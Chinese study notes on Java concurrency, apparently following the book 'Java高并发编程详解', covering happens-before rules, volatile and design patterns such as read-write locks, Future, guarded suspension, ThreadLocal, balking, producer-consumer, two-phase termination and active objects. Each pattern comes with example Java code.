在一个线程内，代码按照编写时的次序执行，编写在后面的操作发生于编写在前面的操作之后。这句话的意思看起来是程序按照編写的顺序来执行，但是虚拟机还是可能会对程序代码的指令进行重排序，只要确保在一个线程内最终的结果和代码顺序执行的结果一致即可。


锁定规则
一个unlock操作要先行发生于对同一个锁的lock操作这句话的意思是，无论是在单线程还是在多线程的环境下，如果同一个锁是锁定状态，那么必须先对其执行释放操作之后才能继续进行lock操作。


volatile变量规则
对一个变量的写操作要早于对这个变量之后的读操作根据字面的意思来理解是，如果一个变量使用volatlle关键字修饰，一个线程对它进行读操作，一个线程对它进行写操作，那么写入操作肯定要先行发生于读操作，


传递规则
如果操作A先于操作B，而操作B又先于操作c，则可以得出操作A肯定要先于操作C，这一点说明了happens-before原则具各传递性


线程启动规则
Thread对象的start()方法先行发生于对该线程的任何操作，所以才说：只有start之后线程才能真正运行，否则Thread也只是一个对象而已


线程中断规则
对线程执行interrupt()方法肯定要优先于捕获到中断信号这句话的意思是指如果线程收到了中断信号，那么在此之前势必要有interrupt()


线程的终结规则
线程中所有的操作都要先行发生于线程的终止检测通俗地讲，线程的任务执行、逻辑单元执行肯定要发生于线程死亡之前。


对象的终结规则
一个对象初始化的完成先行发生于finalwe()方法之前，这个更没什么好说的了，先有生后有死


volatile 关键字特性总结

保证重排序的时候，不会把后面的指令放到屏障之前，也不会把前面的放到后面
强制对缓存的修改操作立刻写入主存
如果是写操作，会导致其他CPU中的缓存失效。

Chapter4：观察者模式

Java高并发编程详解：第十五章

参考：http://c.biancheng.net/view/1390.html

Demo1

设计模式图

代码示例：监控对象
public class Subject {    private List&lt;Observer&gt; observers = new ArrayList&lt;&gt;();    private int state;    public int getState() {        return this.state;    }    public void setState(int state) {        if (this.state == state) {            return;        }        this.state = state;        // Subject存在变更，observers同步执行        notifyAllObserver();    }    private void notifyAllObserver() {        observers.stream().forEach(Observer::update);    }    public void attach(Observer observer) {        this.observers.add(observer);    }}
public abstract class Observer {    protected Subject subject;    public Observer(Subject subject) {        this.subject = subject;        this.subject.attach(this);    }    // 执行体由不同的Observer子类完成    public abstract void update();}
public class BinaryObserver extends Observer {    public BinaryObserver(Subject subject) {        super(subject);    }    @Override    public void update() {        System.out.println("Binary String:" + Integer.toBinaryString(subject.getState()));    }}
public class OctalObserver extends Observer {    public OctalObserver(Subject subject) {        super(subject);    }    @Override    public void update() {        System.out.println("Octal String:" + Integer.toOctalString(subject.getState()));    }}
public class ObserverPatternDemo {    public static void main(String[] args) {        final Subject subject = new Subject();        new BinaryObserver(subject);        new OctalObserver(subject);        System.out.println("===============1==========");        subject.setState(10);        System.out.println("===============2==========");        subject.setState(10);        System.out.println("===============3==========");        subject.setState(20);    }}
Chapter5：Single Thread Execution 设计模式
单线程执行设计模式

Java高并发编程详解：第十六章

线程不安全原因：

共享资源
临界值
多线程竞争（各线程都会有可能变更共享资源的状态）

解决：保证共享资源的写操作同一时间只有一个线程操作
#　Chapter６：读写锁分离设计模式

Java高并发编程详解：第十七章

共享资源在多个线程在进行读写操作时不会引起冲突



线程
读
写




读
不冲突
冲突（只允许单线程运行）


写
冲突（只允许单线程运行）
冲突（只允许单线程运行）



/** * 读写分离锁 */public class ReadWriteLock {    private int readingReaders = 0;    private int waitingReaders = 0;    private int writingWriters = 0;    private int waitingWriters = 0;    // 控制倾向性，有写操作等待时，优先执行    private final boolean preferWriter;    public ReadWriteLock() {        this.preferWriter = true;    }    public ReadWriteLock(boolean preferWriter) {        this.preferWriter = preferWriter;    }    public synchronized void readLock() throws InterruptedException {        try {            this.waitingReaders++;            while (writingWriters &gt; 0 || (preferWriter &amp;&amp; waitingWriters &gt; 0)) {                this.wait();            }            this.readingReaders++;        } finally {            this.waitingReaders--;        }    }    public synchronized void readUnlock() {        this.readingReaders--;        this.notifyAll();    }    public synchronized void writeLock() throws InterruptedException {        try {            this.waitingWriters++;            while (readingReaders &gt; 0 || writingWriters &gt; 0) {                this.wait();            }            writingWriters++;        } finally {            waitingWriters--;        }    }    public synchronized void writeUnlock() {        writingWriters--;        notifyAll();    }}
/** * 共享资源读/写执行 */public class SharedData {    // 共享资源    private final char[] buffer;    // 读写锁    private final ReadWriteLock lock = new ReadWriteLock();    public SharedData(int size) {        // 初始化共享资源        buffer = new char[size];        for (int i = 0; i &lt; size; i++) {            this.buffer[i] = '*';        }    }    public char[] read() throws InterruptedException {        try {            lock.readLock();            return this.doRead();        } finally {            lock.readUnlock();        }    }    public void write(char c) throws InterruptedException {        try {            lock.writeLock();            this.doWrite(c);        } finally {            lock.writeUnlock();        }    }    private void doWrite(char c) {        for (int i = 0; i &lt; buffer.length; i++) {            buffer[i] = c;            slowly(10);        }    }    /**     * @return：共享资源的副本     */    private char[] doRead() {        char[] newBuf = new char[buffer.length];        for (int i = 0; i &lt; buffer.length; i++) {            newBuf[i] = buffer[i];        }        slowly(50);        return newBuf;    }    private void slowly(int ms) {        try {            Thread.sleep(ms);        } catch (InterruptedException e) {        }    }}
/** * 线程-读资源 */public class ReaderWorker extends Thread {    private final SharedData data;    public ReaderWorker(SharedData data) {        this.data = data;    }    @Override    public void run() {        try {            while (true) {                char[] buf = data.read();                System.out.println(Thread.currentThread() + " read " + String.valueOf(buf));            }        } catch (InterruptedException e) {            e.printStackTrace();        }    }}
/** * 线程-写资源 */public class WriterWorker extends Thread {    private static final Random random = new Random(System.currentTimeMillis());    private final SharedData sharedData;    private int index = 0;    private final String filler;    public WriterWorker(SharedData sharedData, String filler) {        this.sharedData = sharedData;        this.filler = filler;    }    @Override    public void run() {        try {            while (true) {                char c = nextChar();                sharedData.write(c);                System.out.println(Thread.currentThread().getName() + " write " + c);                Thread.sleep(random.nextInt(1000));            }        } catch (InterruptedException e) {            e.printStackTrace();        }    }    private char nextChar() {        char c = filler.charAt(index);        index++;        if (index &gt;= filler.length())            index = 0;        return c;    }}
测试类
public class ReadWritLockClient {    public static void main(String[] args) {        final SharedData sharedData = new SharedData(10);        new ReaderWorker(sharedData).start();        new ReaderWorker(sharedData).start();        new ReaderWorker(sharedData).start();        new ReaderWorker(sharedData).start();        new ReaderWorker(sharedData).start();        new WriterWorker(sharedData, "qwertyuiopasdfg").start();        new WriterWorker(sharedData, "QWERTYUIOPASDFG").start();    }}
Chapter7：不可变对象设计模式

Java高并发编程详解：第十八章

不可变对象定义

不可变对象是没有机会去修改的
每一次修改都会导致一个新的对象的产生。

不可变对象必要条件（String、Integer、Float 等）


确保类是final 的，不允许被其他类继承。（final修饰的类，被继承的提示：There is no default constructor available in ‘com.hots.part2.chapter7.Person’）


确保所有的成员变量是final 的，引用类型所引用的对象同样不可变


不要提供任何setter 方法。
引用集合，GET方法返回unmodifiable的集合
public List&lt;String&gt; getList() {    return Collections.unmodifiableList(list);}


如果要修改类的状态，必须返回一个新的对象。


/** * 不可变对象 */final public class Person {    private final String name;    private final String address;    public Person(final String name, final String address) {        this.name = name;        this.address = address;    }    public String getName() {        return name;    }    public String getAddress() {        return address;    }    @Override    public String toString() {        return "Person{" +                "name='" + name + '\'' +                ", address='" + address + '\'' +                '}';    }}
Chapter8：Future设计模式

Java高并发编程详解：第十九章

Future 代表的是未来的一个凭据，保留隔离的逻辑程序执行结果
public interface Future&lt;T&gt; {    T get();}
public class AsyncFuture&lt;T&gt; implements Future&lt;T&gt; {    private volatile boolean done = false;    private T result;    public void done(T result) {        synchronized (this) {            this.result = result;            this.done = true;            this.notifyAll();        }    }    @Override    public T get() throws InterruptedException {        synchronized (this) {            while (!done) {                this.wait();            }        }        return result;    }}
public interface FutureTask&lt;T&gt; {    T call();}
public class FutureService {    public &lt;T&gt; Future&lt;T&gt; submit(final FutureTask&lt;T&gt; futureTask, final Consumer&lt;T&gt; consumer) {        AsyncFuture&lt;T&gt; asyncFuture = new AsyncFuture&lt;&gt;();        new Thread(() -&gt; {            T result = futureTask.call();            asyncFuture.done(result);            consumer.accept(result);        }).start();        return asyncFuture;    }}
public class SyncInvoker {    public static void main(String[] args) throws InterruptedException {        FutureTask&lt;String&gt; futureTask = () -&gt; {            try {                TimeUnit.SECONDS.sleep(15);            } catch (InterruptedException e) {                throw new RuntimeException(e);            }            return "finish jobs";        };        FutureService futureService = new FutureService();        Future&lt;String&gt; result = futureService.submit(futureTask, System.out::println);        System.out.println("===========");        System.out.println("do other thing.");        TimeUnit.SECONDS.sleep(10);        System.out.println("===========");        System.out.println("results from job：" + result.get());    }}
Chapter9：Guarded Suspension 设计模式（保护性暂挂模式）

Java高并发编程详解：第二十章

当线程访问某个对象时，发现条件不满足，就暂时挂起等待条件满足时再次访问。

处理的消息内容

public class Request {    final private String value;    public Request(String value) {        this.value = value;    }    public String getValue() {        return value;    }}
public class RequestQueue {    // 任务队列    private final LinkedList&lt;Request&gt; queue = new LinkedList&lt;&gt;();    /**     * 服务端处理任务     */    public Request getRequest() {        synchronized (queue) {            while (queue.size() &lt;= 0) {                try {                    queue.wait();                } catch (InterruptedException e) {                    System.out.println("queue wait interrupted");                    return null;                }            }            return queue.removeFirst();        }    }    /**     * 客户端推送任务     */    public void putRequest(Request request) {        synchronized (queue) {            queue.add(request);            queue.notifyAll();        }    }}
/** * 客户端: 发送任务 */public class ClientThread extends Thread {    private final RequestQueue queue;    private Random random;    private final String sendValue;    public ClientThread(RequestQueue queue, String sendValue) {        this.queue = queue;        this.sendValue = sendValue;        this.random = new Random(System.currentTimeMillis());    }    @Override    public void run() {        for (int i = 0; i &lt; 10; i++) {            System.out.println("Client -&gt; request " + sendValue);            queue.putRequest(new Request(sendValue));            try {                Thread.sleep(random.nextInt(50));            } catch (InterruptedException e) {                System.out.println("Client -&gt; Wake up from sleeping");                e.printStackTrace();            }        }    }}
/** * 服务端：处理任务 */public class ServerThread extends Thread {    private RequestQueue queue;    private Random random;    private volatile boolean closed = false;    public ServerThread(RequestQueue queue) {        this.queue = queue;        this.random = new Random(System.currentTimeMillis());    }    @Override    public void run() {        while (!closed) {            Request request = queue.getRequest();            if (null == request) {                // queue从wait中被打断                System.out.println("Received the empty request.");                continue;            }            System.out.println("Server -&gt;" + request.getValue());            try {                Thread.sleep(random.nextInt(100));            } catch (InterruptedException e) {                System.out.println("Server -&gt; Wake up from sleeping");                return;            }        }    }    /**     * 关闭服务端线程     */    public void close() {        this.closed = true;        this.interrupt();    }}
/** * 测试类 */public class SuspensionClient {    public static void main(String[] args) throws InterruptedException {        final RequestQueue queue = new RequestQueue();        ClientThread clientThread = new ClientThread(queue, "test");        clientThread.start();        ServerThread serverThread = new ServerThread(queue);        serverThread.start();        Thread.sleep(10000);        System.out.println("Server ready to close.");        serverThread.close();    }}
Chapter10：ThreadLocal：线程局部变量


This class provides thread-local variables. These variables differ from their  normal counterparts in that each thread that accesses one (via its  get or set method) has its own, independently  initialized copy of the variable.


ThreadLocal instances are  typically private static fields in classes that wish to associate state with a  thread (e.g., a user ID or Transaction ID).


每个访问ThreadLocal变量的线程，都会获取到一个ThreadLocal变量的副本，线程之间互不影响。


始终以当前线程作为KEY值


public class ThreadLocalSimpleTest {    private static ThreadLocal&lt;String&gt; threadLocal = new ThreadLocal&lt;String&gt;() {        @Override        protected String initialValue() {            return "设置默认值";        }    };    public static void main(String[] args) throws InterruptedException {        // 主线程获取ThreadLocal        System.out.println(Thread.currentThread().getName() + "--" + threadLocal.hashCode() + "---" + threadLocal.get());        threadLocal.set("TEST");        Thread.sleep(1_000L);        System.out.println(Thread.currentThread().getName() + "--" + threadLocal.hashCode() + "---" + threadLocal.get());        new Thread(() -&gt; {            threadLocal.set("TEST-1");            System.out.println(Thread.currentThread().getName() + "--" + threadLocal.hashCode() + "---" + threadLocal.get());        }).start();        new Thread(() -&gt; {            threadLocal.set("TEST-2");            System.out.println(Thread.currentThread().getName() + "--" + threadLocal.hashCode() + "---" + threadLocal.get());        }).start();        Thread.sleep(1_000L);        // 主线程再次获取ThreadLocal        System.out.println(Thread.currentThread().getName() + "--" + threadLocal.hashCode() + "---" + threadLocal.get());    }}
输出
main--1836019240---设置默认值main--1836019240---TESTThread-0--1836019240---TEST-1Thread-1--1836019240---TEST-2main--1836019240---TEST
Chapter11：The Thread-Specific Storage：线程保险箱

Java高并发编程详解：第二十一章

线程上下文：线程级别的单例，利用ThreadLocal实现。
/** * 上下文内容 */@Getter@Setterpublic class Context {    private String name;    private String cardId;}
/** * 线程上下文工具类：线程级别的单例 */public class ActionContext {    private ActionContext() {    }    private static final ThreadLocal&lt;Context&gt; threadLocal = new ThreadLocal&lt;Context&gt;() {        @Override        protected Context initialValue() {            return new Context();        }    };    private static class ContextHolder {        private final static ActionContext actionContext = new ActionContext();    }    public static ActionContext getActionContext() {        return ActionContext.ContextHolder.actionContext;    }    public Context getContext() {        return threadLocal.get();    }}
/** * 线程工作内容 */public class ExecutionTask implements Runnable {    private QueryFromDBAction queryFromDBAction = new QueryFromDBAction();    private QueryFromHttpAction queryFromHttpAction = new QueryFromHttpAction();    @Override    public void run() {        // 分步骤获取        queryFromDBAction.execute();        System.out.println(Thread.currentThread().getName() + " The name query successful");        queryFromHttpAction.execute();        System.out.println(Thread.currentThread().getName() + " The card id query successful");        // 最后，统一获取        Context context = ActionContext.getActionContext().getContext();        System.out.println("The Name is " + context.getName() + " and CardId " + context.getCardId());    }}
/** * 线程工作内容：从DB获取 */public class QueryFromDBAction {    public void execute() {        try {            Thread.sleep(1000L);            String name = "Alex " + Thread.currentThread().getName();            ActionContext.getActionContext().getContext().setName(name);        } catch (InterruptedException e) {            e.printStackTrace();        }    }}
/** * 线程工作内容：从网络获取 */public class QueryFromHttpAction {    public void execute() {        Context context = ActionContext.getActionContext().getContext();        String name = context.getName();        String cardId = getCardId(name);        context.setCardId(cardId);    }    private String getCardId(String name) {        try {            Thread.sleep(1000L);        } catch (InterruptedException e) {            e.printStackTrace();        }        return "435467523543" + Thread.currentThread().getId();    }}
/** * 测试类 */public class ContextTest {    public static void main(String[] args) {        IntStream.range(1, 5)                .forEach(i -&gt;                        new Thread(new ExecutionTask()).start()                );    }}
Chapter12：Balking设计模式
某个线程发现其他线程正在执行相同的任务而放弃即将开始的任务（修改之前的判断）

Java高并发编程详解：第二十二章

import java.io.FileWriter;import java.io.IOException;import java.io.Writer;/** * balking 设计模式核心：save 方法 */public class BalkingData {    private String fileName;    private String content;    private boolean changed;    public BalkingData(String fileName, String content) {        this.fileName = fileName;        this.content = content;        this.changed = true;    }    public synchronized void change(String newContent) {        this.content = newContent;        this.changed = true;    }    /**     * 多个线程同时执行保存任务，其中一个线程完成后changed被调整，另外一个线程不会继续执行     */    public synchronized void save() throws IOException {        if (!changed) {            return;        }        doSave();        this.changed = false;    }    private void doSave() throws IOException {        System.out.println(Thread.currentThread().getName() + " calls do save. content = " + content);        try (Writer writer = new FileWriter(fileName, true)) {            writer.write(content);            writer.write(System.getProperty("line.separator"));            writer.flush();        }    }}
/** * 线程A: 程序触发保存任务 */public class CustomerThread extends Thread {    private final BalkingData balkingData;    private final Random random = new Random(System.currentTimeMillis());    public CustomerThread(BalkingData balkingData) {        super("Customer");        this.balkingData = balkingData;    }    @Override    public void run() {        try {            // 保存数据            balkingData.save();            for (int i = 0; i &lt; 20; i++) {                // 变更数据                balkingData.change("No." + i);                Thread.sleep(random.nextInt(1_000));                // 保存数据                balkingData.save();            }        } catch (IOException e) {            e.printStackTrace();        } catch (InterruptedException e) {            e.printStackTrace();        }    }}
/** * 线程B：后台自动保存 */public class WaiterThread extends Thread {    private final BalkingData balkingData;    public WaiterThread(BalkingData balkingData) {        super("Waiter");        this.balkingData = balkingData;    }    @Override    public void run() {        for (int i = 0; i &lt; 20; i++) {            try {                // 后台自动保存                balkingData.save();                Thread.sleep(200L);            } catch (IOException e) {                e.printStackTrace();            } catch (InterruptedException e) {                e.printStackTrace();            }        }    }}
/** * 测试类 */public class BalkingTest {    public static void main(String[] args) {        String fileName = "D:\\RECEIVED\\test.txt";        String content = "&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; BEGIN &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;";        BalkingData balkingData = new BalkingData(fileName, content);        new WaiterThread(balkingData).start();        new CustomerThread(balkingData).start();    }}
Chapter13：生产者/消费者模式
`/** * 消费主体 */public class Message {    private String data;    public Message(String data) {        this.data = data;    }    public String getData() {        return data;    }}
/** * 消费队列 */public class MessageQueue {    private final static int DEFAULT_MAX_LIMIT = 100;    private final LinkedList&lt;Message&gt; queue;    private final int limit;    public MessageQueue() {        this(DEFAULT_MAX_LIMIT);    }    public MessageQueue(final int limit) {        this.limit = limit;        this.queue = new LinkedList&lt;&gt;();    }    public void put(Message message) throws InterruptedException {        synchronized (queue) {            while (queue.size() &gt; limit) {                queue.wait();            }            queue.addLast(message);            queue.notifyAll();        }    }    public Message take() throws InterruptedException {        synchronized (queue) {            while (queue.size() == 0) {                queue.wait();            }            Message message = queue.removeFirst();            queue.notifyAll();            return message;        }    }}
import java.util.Random;import java.util.concurrent.atomic.AtomicInteger;/** * 生产者 */public class ProducerThread extends Thread {    private final MessageQueue messageQueue;    private final static Random random = new Random(System.currentTimeMillis());    private final static AtomicInteger counter = new AtomicInteger(0);    public ProducerThread(MessageQueue messageQueue, int seq) {        super("PRODUCER-" + seq);        this.messageQueue = messageQueue;    }    @Override    public void run() {        while (true) {            try {                Message message = new Message("Message-" + counter.getAndIncrement());                messageQueue.put(message);                System.out.println(Thread.currentThread().getName() + " put message " + message.getData());                Thread.sleep(random.nextInt(1000));            } catch (InterruptedException e) {                e.printStackTrace();                break;            }        }    }}
/** * 消费者 */public class ConsumerThread extends Thread {    private final MessageQueue messageQueue;    private final static Random random = new Random(System.currentTimeMillis());    public ConsumerThread(MessageQueue messageQueue, int seq) {        super("CONSUMER-" + seq);        this.messageQueue = messageQueue;    }    @Override    public void run() {        while (true) {            try {                Message message = messageQueue.take();                System.out.println(Thread.currentThread().getName() + " take message " + message.getData());                Thread.sleep(random.nextInt(1000));            } catch (InterruptedException e) {                e.printStackTrace();                break;            }        }    }}
/** * 测试类 */public class ProducerAndConsumerClient {    public static void main(String[] args) {        final MessageQueue messageQueue = new MessageQueue();        new ProducerThread(messageQueue, 1).start();        new ProducerThread(messageQueue, 2).start();        new ProducerThread(messageQueue, 3).start();        new ConsumerThread(messageQueue, 1).start();        new ConsumerThread(messageQueue, 2).start();    }}
Chapter14：Latch 设计模式（阀门设计模式）

Java高并发编程详解：第二十三章

等待所有条件满足时，阀门才会被打开：利用CountDownLatch
import java.util.Random;import java.util.concurrent.CountDownLatch;import java.util.stream.IntStream;public class JDKCountDown {    private static final Random random = new Random(System.currentTimeMillis());    public static void main(String[] args) throws InterruptedException {        final CountDownLatch latch = new CountDownLatch(5);        System.out.println("准备多线程处理任务.");        //The first phase.        IntStream.rangeClosed(1, 5).forEach(i -&gt;                new Thread(() -&gt; {                    System.out.println(Thread.currentThread().getName() + " is working.");                    try {                        Thread.sleep(random.nextInt(1000));                    } catch (InterruptedException e) {                        e.printStackTrace();                    }                    latch.countDown();                }, String.valueOf(i)).start()        );        // 无限等待        latch.await();        //The second phase.        System.out.println("多线程任务全部结束,准备第二阶段任务");        System.out.println("............");        System.out.println("FINISH");    }}
Chapter15：Thread-Per-Message 设计模式

Java高并发编程详解：第二十四章

为每一个消息的处理开辟一个线程，使得消息能够以并发的方式进行处理，从而提高系统整体的吞吐能力。
public class Message {    private final String value;    public Message(String value) {        this.value = value;    }    public String getValue() {        return value;    }}
import java.util.Random;import java.util.concurrent.ExecutorService;import java.util.concurrent.Executors;public class MessageHandler {    private final static Random random = new Random(System.currentTimeMillis());    private final static ExecutorService executor = Executors.newFixedThreadPool(5);    public void request(Message message) {        executor.execute(() -&gt; {            String value = message.getValue();            try {                Thread.sleep(random.nextInt(1000));                System.out.println("The message will be handle by " + Thread.currentThread().getName() + " " + value);            } catch (InterruptedException e) {                e.printStackTrace();            }        });    }    public void shutdown() {        executor.shutdown();    }}
import java.util.stream.IntStream;public class PerThreadClient {    public static void main(String[] args) {        final MessageHandler handler = new MessageHandler();        IntStream.rangeClosed(0, 10)                .forEach(                        i -&gt; handler.request(new Message(String.valueOf(i)))                );        handler.shutdown();    }}
Chapter16：Two Phase Termination 设计模式

Java高并发编程详解：第二十五章

当一个线程正常结束，我们需要考虑如何正常释放线程中资源：文件句柄、Socket套接字句柄、数据库连接等

在第二阶段释放资源的时候需要考虑如下几个问题：

第二阶段的终止需要保证安全性，比如涉及对共享资源的操作
对资源的释放时间需要控制在一个可控的时间范围内
要百分百的确保线程的结束：第二阶段出现死循环、线程阻塞等异常无法结束


简单的two phrase termination 设计模式实现：利用finally执行

import java.util.Random;public class CounterIncrement extends Thread {    private volatile boolean terminated = false;    private int counter = 0;    private Random random = new Random(System.currentTimeMillis());    @Override    public void run() {        try {            while (!terminated) {                System.out.println(Thread.currentThread().getName() + " " + counter++);                Thread.sleep(random.nextInt(1000));            }        } catch (InterruptedException e) {            e.printStackTrace();        } finally {            this.clean();        }    }    /**     * 执行程序结束后的任务     */    private void clean() {        System.out.println("do some clean work for the second phase,current counter " + counter);    }    /**     * 结束线程     */    public void close() {        this.terminated = true;    }}
public class CounterTest {    public static void main(String[] args) throws InterruptedException {        CounterIncrement counterIncrement = new CounterIncrement();        counterIncrement.start();        Thread.sleep(10_000L);        counterIncrement.close();    }}


Socket套接字


服务端
线程池容量为2，等待其他连接关闭，才会处理第三个链接任务
import java.io.IOException;import java.net.ServerSocket;import java.net.Socket;import java.util.LinkedList;import java.util.List;import java.util.concurrent.ExecutorService;import java.util.concurrent.Executors;public class AppServer extends Thread {    private final int port;    private static final int DEFAULT_PORT = 12722;    private volatile boolean start = true;    private final List&lt;ClientHandler&gt; clientHandlers = new LinkedList&lt;&gt;();    private final ExecutorService executor = Executors.newFixedThreadPool(2);    private ServerSocket serverSocket;    public AppServer() {        this.port = DEFAULT_PORT;    }    public AppServer(int port) {        this.port = port;    }    @Override    public void run() {        try {            this.serverSocket = new ServerSocket(port);            System.out.println("端口：" + port + "，正在等待客户端连接.....");            while (start) {                // 获取客户端链接                Socket client = serverSocket.accept();                // 保留客户端链接，用于退出前的清理                 ClientHandler clientHandler = new ClientHandler(client);                clientHandlers.add(clientHandler);                // 提交任务处理                executor.submit(clientHandler);            }        } catch (IOException e) {            e.printStackTrace();        } finally {            this.dispose();        }    }    /**     * 清理线程程池资源     */    private void dispose() {        System.out.println("清理线程程池资源.....");        // 关闭客户端链接        clientHandlers.stream().forEach(e -&gt; e.shutDown());        executor.shutdown();    }    /**     * 关闭服务端     */    public void shutDown() {        System.out.println("关闭服务端.....");        this.start = false;        this.interrupt();        try {            serverSocket.close();            System.out.println("服务端正常关闭");        } catch (IOException e) {            System.out.println("服务端关闭失败 : " + e.getMessage());        }    }}


客户端
import java.io.*;import java.net.Socket;/** * 处理客户端请求 */public class ClientHandler extends Thread {    private volatile boolean running = true;    private final Socket socket;    public ClientHandler(Socket socket) {        this.socket = socket;    }    @Override    public void run() {        try (InputStream inputStream = socket.getInputStream();             BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));             OutputStream outputStream = socket.getOutputStream();             PrintWriter printWriter = new PrintWriter(outputStream);        ) {            while (running) {                // 读取客户端提供数据                String message = bufferedReader.readLine();                if (message == null) {                    break;                }                System.out.println("读取客户端数据 &gt;" + message);                // 回写数据给客户端                printWriter.write("echo " + message + "\n");                printWriter.flush();            }            System.out.println("客户端正常关闭");        } catch (IOException e) {            e.printStackTrace();        } finally {            this.shutDown();        }    }    public void shutDown() {        if (!running) {            // 客户端已经执行完成：balking设计模式            return;        }        this.running = false;        try {            this.socket.close();            System.out.println("客户端正常关闭");        } catch (IOException e) {            System.out.println("客户端关闭失败：" + e.getMessage());        }    }}


测试类：启动服务端
public class AppServerClient {    public static void main(String[] args) throws InterruptedException {        AppServer appServer = new AppServer(12312);        appServer.start();        // Thread.sleep(20_000L);        // appServer.shutDown();    }}




Chapter17：Worker-Thread 设计模式
线程池在某种意义上也是一种worker-thread设计模式的实现

Java高并发编程详解：第二十六章

Chapter18：Active Objects 设计模式
拥有独立线程的对象（主动对象）接受异步消息，并且能够返回处理结果的设计模式

功能说明：提交任务、执行任务拆分为两个独立的线程


ActiveObjectFactory 创建 ActiveObjectProxy，ActiveObjectProxy 包含了 ActiveObject的两种行为方式


ActiveObjectProxy  包含一个执行任务线程： SchedulerThread ，创建即启动，监听任务队列ActivationQueue，有任务，就处理。


ActiveObjectProxy  接收到的 makeString 任务和 displayString 任务都被包装为MethodRequest提交到SchedulerThread的任务队列ActivationQueue。
每个任务的具体执行包含在MethodRequest中（抽象的execute方法，由子类实现）。


MethodRequest执行execute任务之后 ，将执行结果反馈给FutureResult


具体代码如下
/** * 任务定义接口 */public interface ActiveObject {    Result makeString(int count, char fillChar);    void displayString(String text);}
class ActiveObjectProxy implements ActiveObject {    private final SchedulerThread schedulerThread;    private final Servant servant;    public ActiveObjectProxy(SchedulerThread schedulerThread, Servant servant) {        this.schedulerThread = schedulerThread;        this.servant = servant;    }    /**     * 将提交的request任务（makeString）推送到执行线程     *     * @return FutureResult：包装任务完成的执行结果     */    @Override    public Result makeString(int count, char fillChar) {        FutureResult future = new FutureResult();        schedulerThread.invoke(new MakeStringRequest(servant, future, count, fillChar));        return future;    }    /**     * 将提交的request任务（displayString）推送到执行线程     */    @Override    public void displayString(String text) {        schedulerThread.invoke(new DisplayStringRequest(servant, text));    }}
/** * 任务的具体定义类 */class Servant implements ActiveObject {    @Override    public Result makeString(int count, char fillChar) {        char[] buf = new char[count];        for (int i = 0; i &lt; count; i++) {            buf[i] = fillChar;            try {                Thread.sleep(10);            } catch (Exception e) {            }        }        return new RealResult(new String(buf));    }    @Override    public void displayString(String text) {        try {            System.out.println("Display:" + text);            Thread.sleep(10);        } catch (Exception e) {            e.printStackTrace();        }    }}
/** * 由SchedulerThread管理的任务队列 */class ActivationQueue {    private final static int MAX_METHOD_REQUEST_QUEUE_SIZE = 100;    private LinkedList&lt;MethodRequest&gt; methodQueue;    public ActivationQueue() {        methodQueue = new LinkedList&lt;&gt;();    }    /**     * 提交任务到任务队列     */    public synchronized void put(MethodRequest request) {        while (methodQueue.size() &gt;= MAX_METHOD_REQUEST_QUEUE_SIZE) {            try {                this.wait();            } catch (InterruptedException e) {                e.printStackTrace();            }        }        methodQueue.addFirst(request);        this.notifyAll();    }    /**     * 从任务队列提取任务     */    public synchronized MethodRequest take() {        while (methodQueue.isEmpty()) {            try {                this.wait();            } catch (InterruptedException e) {                e.printStackTrace();            }        }        MethodRequest methodRequest = methodQueue.removeFirst();        this.notifyAll();        return methodRequest;    }}
import java.util.LinkedList;public class SchedulerThread extends Thread {    private final ActivationQueue activationQueue;    public SchedulerThread(ActivationQueue activationQueue) {        this.activationQueue = activationQueue;    }    /**     * 提交任务到任务队列     */    public void invoke(MethodRequest request) {        this.activationQueue.put(request);    }    /**     * 执行任务队列中的任务     */    @Override    public void run() {        while (true) {            // 执行提交的任务的任务主体            // execute的内容，存在于提交的request中            activationQueue.take().execute();        }    }}
public interface Result {    Object getResultValue();}/** * 仅包可见 */class RealResult implements Result {    private final Object resultValue;    public RealResult(Object resultValue) {        this.resultValue = resultValue;    }    @Override    public Object getResultValue() {        return resultValue;    }}/** * 返回的任务结果，仅包可见 */class FutureResult implements Result {    private Result result;    private boolean ready = false;    public synchronized void setResult(Result result) {        this.result = result;        this.ready = true;        // 通知等待提取任务结果的线程，任务结束        this.notifyAll();    }    @Override    public synchronized Object getResultValue() {        while (!ready) {            try {                this.wait();            } catch (InterruptedException e) {                e.printStackTrace();            }        }        return this.result.getResultValue();    }}
abstract class MethodRequest {    protected final Servant servant;    protected final FutureResult futureResult;    public MethodRequest(Servant servant, FutureResult futureResult) {        this.servant = servant;        this.futureResult = futureResult;    }    /**     * 提交任务的抽象方法。具体执行内容由子类定义。     * 执行者交给servant，执行结果包装到futureResult中     */    public abstract void execute();}
class MakeStringRequest extends MethodRequest {    private final int count;    private final char fillChar;    public MakeStringRequest(Servant servant, FutureResult futureResult, int count, char fillChar) {        super(servant, futureResult);        this.fillChar = fillChar;        this.count = count;    }    /**     * 任务执行的主体     */    @Override    public void execute() {        futureResult.setResult(servant.makeString(count, fillChar));    }}class DisplayStringRequest extends MethodRequest {    private final String text;    public DisplayStringRequest(Servant servant, final String text) {        super(servant, null);        this.text = text;    }    /**     * 任务执行的主体     */    @Override    public void execute() {        this.servant.displayString(text);    }}
public final class ActiveObjectFactory {    public static ActiveObject createActiveObject() {        Servant servant = new Servant();        ActivationQueue queue = new ActivationQueue();        SchedulerThread schedulerThread = new SchedulerThread(queue);        ActiveObjectProxy proxy = new ActiveObjectProxy(schedulerThread, servant);        schedulerThread.start();        return proxy;    }}
以上对外开放的类仅仅ActiveObjectFactory、ActiveObject、Result
以下为测试代码
import com.hots.part2.chapter18.action.ActiveObject;public class DisplayClientThread extends Thread {    private final ActiveObject activeObject;    public DisplayClientThread(String name, ActiveObject activeObject) {        super(name);        this.activeObject = activeObject;    }    @Override    public void run() {        try {            for (int i = 0; true; i++) {                String text = Thread.currentThread().getName() + "=&gt;" + i;                activeObject.displayString(text);                Thread.sleep(200);            }        } catch (Exception e) {            e.printStackTrace();        }    }}
